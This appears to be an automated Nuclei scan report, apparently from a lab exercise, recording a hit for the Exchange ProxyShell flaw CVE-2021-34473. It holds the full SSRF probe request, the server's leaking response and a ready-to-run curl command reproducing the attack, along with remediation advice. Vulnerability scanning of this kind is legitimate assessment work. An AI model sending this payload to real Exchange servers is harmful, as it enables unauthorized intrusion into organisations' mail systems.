### Exchange Server - Remote Code Execution (CVE-2021-34473) found on https://10.10.252.86
---
**Details**: **CVE-2021-34473**  matched at https://10.10.252.86

**Protocol**: HTTP

**Full URL**: https://10.10.252.86/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com

**Timestamp**: Thu Apr 6 23:00:16 +0100 BST 2023

**Template Information**

| Key | Value |
|---|---|
| Name | Exchange Server - Remote Code Execution |
| Authors | arcc, intx0x80, dwisiswant0, r3dg33k |
| Tags | cve, cve2021, ssrf, rce, exchange, kev |
| Severity | critical |
| Description | Microsoft Exchange Server is vulnerable to a remote code execution vulnerability. This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.<br> |
| Remediation | Apply Microsoft Exchange Server 2019 Cumulative Update 9 or upgrade to the latest version. |
| CVSS-Metrics | [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CVE-ID | [CVE-2021-34473](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2021-34473) |
| CVSS-Score | 9.80 |

**Request**
```http
GET /autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com HTTP/1.1
Host: 10.10.252.86
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip


```

**Response**
```http
HTTP/1.1 302 Found
Connection: close
Content-Length: 673
Cache-Control: no-cache, no-store
Content-Type: text/html; charset=utf-8
Date: Thu, 06 Apr 2023 22:00:15 GMT
Expires: -1
Location: /owa/auth/errorfe.aspx?httpCode=500&msg=3529056431&msgParam=NT+AUTHORITY%5cSYSTEM&owaError=Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException&owaVer=15.2.858.2&be=WIN-12OUO7A66M7&ts=133252920155753728&fe=WIN-12OUO7A66M7&reqid=02837b7e-5411-4e2c-9a5f-d6cf8502ed6f&creqid=&cid=&rt=Form15&et=DefaultPage&pal=0&dag=DagNotFound&forest=thm.local&te=0&refurl=https%3a%2f%2fwin-12ouo7a66m7.thm.local%3a444%2fowa%2f%3f%26Email%3dautodiscover%2fautodiscover.json%253F%40test.com
Pragma: no-cache
Request-Id: 02837b7e-5411-4e2c-9a5f-d6cf8502ed6f
Server: Microsoft-IIS/10.0
Set-Cookie: ClientId=0EDF33DD3AF54A8EA4645B0BEFEB35D0; expires=Sat, 06-Apr-2024 22:00:15 GMT; path=/; secure
Set-Cookie: X-BackEndCookie=; expires=Tue, 06-Apr-1993 22:00:15 GMT; path=/autodiscover; secure; HttpOnly
X-Aspnet-Version: 4.0.30319
X-Backend-Begin: 2023-04-06T15:00:15.509
X-Backend-End: 2023-04-06T15:00:15.588
X-Beserver: WIN-12OUO7A66M7
X-Calculatedbetarget: win-12ouo7a66m7.thm.local
X-Content-Type-Options: nosniff
X-Diaginfo: WIN-12OUO7A66M7
X-Feserver: WIN-12OUO7A66M7
X-Owa-Diagnosticsinfo: 78;8;0
X-Owa-Error: Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException,Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
X-Owasupplevel: TenantAdmin
X-Powered-By: ASP.NET
X-Ua-Compatible: IE=EmulateIE7

<html><head><title>Object moved</title></head><body>
<h2>Object moved to <a href="/owa/auth/errorfe.aspx?httpCode=500&amp;msg=3529056431&amp;msgParam=NT+AUTHORITY%5cSYSTEM&amp;owaError=Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException&amp;owaVer=15.2.858.2&amp;be=WIN-12OUO7A66M7&amp;ts=133252920155753728&amp;fe=WIN-12OUO7A66M7&amp;reqid=02837b7e-5411-4e2c-9a5f-d6cf8502ed6f&amp;creqid=&amp;cid=&amp;rt=Form15&amp;et=DefaultPage&amp;pal=0&amp;dag=DagNotFound&amp;forest=thm.local&amp;te=0&amp;refurl=https%3a%2f%2fwin-12ouo7a66m7.thm.local%3a444%2fowa%2f%3f%26Email%3dautodiscover%2fautodiscover.json%253F%40test.com">here</a>.</h2>
</body></html>

```

References: 
- https://msrc.microsoft.com/update-guide/vulnerability/cve-2021-34473
- https://blog.orange.tw/2021/08/proxylogon-a-new-attack-surface-on-ms-exchange-part-1.html
- https://peterjson.medium.com/reproducing-the-proxyshell-pwn2own-exploit-49743a4ea9a1
- https://nvd.nist.gov/vuln/detail/cve-2021-34473

**CURL Command**
```
curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36' 'https://10.10.252.86/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com'
```
---
Generated by [Nuclei 2.9.0](https://github.com/projectdiscovery/nuclei)